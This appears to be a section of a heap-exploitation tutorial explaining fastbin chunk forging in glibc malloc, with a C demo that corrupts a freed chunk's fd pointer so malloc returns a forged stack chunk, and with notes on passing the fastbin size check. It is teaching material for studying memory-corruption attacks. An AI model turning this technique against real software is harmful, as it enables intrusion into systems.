# Forging chunks

After a chunk is freed, it is inserted in a binlist. However, the pointer is still available in the program. If the attacker has control of this pointer, he/she can modify the linked list structure in bins and insert his/her own 'forged' chunk. The sample program shown below shows how this is possible in the case of fastbin freelist.

```c
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);               // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```

The forged chunk's size parameter was set equal to 0x20 so that it passes the security check "malloc(): memory corruption (fast)". This check checks whether the size of the chunk falls in the range for that particular fastbin. Also, note that the data for an allocated chunk starts from the 'fd' pointer. This is also evident in the above program as `victim` points `0x10` (0x8+0x8) bytes ahead of the 'forged chunk'.

The state of the particular fastbin progresses as:

1. 'a' freed.
  > head -> a -> tail
2. a's fd pointer changed to point to 'forged chunk'.
  > head -> a -> forged chunk -> undefined (fd of forged chunk will in fact be holding attacker's data)
3. 'malloc' request
  > head -> forged chunk -> undefined
4. 'malloc' request by victim
  > head -> undefined   [ forged chunk is returned to the victim ]

Note the following:

* Another 'malloc' request for the fast chunk in the same bin list will result in segmentation fault.
* Even though we request for 10 bytes and set the size of the forged chunk as 32 (0x20) bytes, both fall in the same fastbin range of 32-byte chunks.
* This attack for small and large chunks will be seen later as 'House of Lore'.
* The above code is designed for 64-bit machines. To run it on 32-bit machines, replace `unsigned long long` with `unsigned int` as pointers are now 4 bytes instead of 8 bytes. Also, instead of using 32 bytes as size for forged chunk, a small of the size of around 17 bytes should work.
